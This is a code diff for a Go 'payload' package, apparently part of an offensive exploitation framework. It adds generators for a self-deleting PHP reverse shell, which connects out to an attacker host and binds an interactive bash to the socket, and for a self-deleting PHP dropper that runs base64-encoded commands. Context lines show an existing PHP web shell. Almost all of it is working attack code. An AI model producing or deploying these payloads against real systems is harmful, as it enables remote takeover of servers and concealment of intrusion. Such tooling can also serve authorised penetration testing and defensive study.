@@ -1,6 +1,32 @@
 package payload
 
-import "fmt"
+import (
+	"encoding/base64"
+	"fmt"
+
+	"github.com/Chocapikk/pik/sdk"
+)
+
+func init() {
+	sdk.SetPHPReverseShell(PHPReverseShellDrop)
+	sdk.SetPHPSystem(PHPSystemDrop)
+}
+
+// PHPReverseShellDrop returns a self-deleting PHP reverse shell for file drop.
+// Uses proc_open with /bin/bash -i for an interactive session.
+func PHPReverseShellDrop(lhost string, lport int) string {
+	return fmt.Sprintf(
+		`<?php unlink(__FILE__);$s=fsockopen("%s",%d);$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes); ?>`,
+		lhost, lport,
+	)
+}
+
+// PHPSystemDrop returns a self-deleting PHP system exec for file drop.
+// The command is base64-encoded for safe transport.
+func PHPSystemDrop(cmd string) string {
+	return fmt.Sprintf(`<?php unlink(__FILE__);system(base64_decode("%s")); ?>`,
+		base64.StdEncoding.EncodeToString([]byte(cmd)))
+}
 
 // PHPWebShell returns a minimal PHP web shell.
 // Execute commands via: curl target/shell.php?cmd=id
